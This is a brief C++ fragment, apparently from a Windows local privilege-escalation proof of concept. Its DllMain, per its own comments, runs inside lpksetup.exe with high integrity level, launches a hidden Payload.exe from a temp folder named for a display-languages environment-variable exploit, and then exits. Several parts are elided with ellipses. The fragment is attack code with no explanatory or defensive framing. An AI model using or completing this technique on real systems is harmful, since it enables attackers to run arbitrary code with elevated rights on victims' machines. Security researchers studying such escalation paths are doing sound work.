...
bool WINAPI DllMain(HINSTANCE hInstDll, DWORD fdwReason, LPVOID lpvReserved)
{
	...
	{
		// We now run in lpksetup.exe with high IL
		...
		CreateProcessW((GetTempFolderPath() + L"\\DisplayLanguagesVolatileEnvironmentLPE\\Payload.exe").c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &STARTUPINFOW(), &PROCESS_INFORMATION());

		// High IL granted, leaving.
		ExitProcess(0);
	}
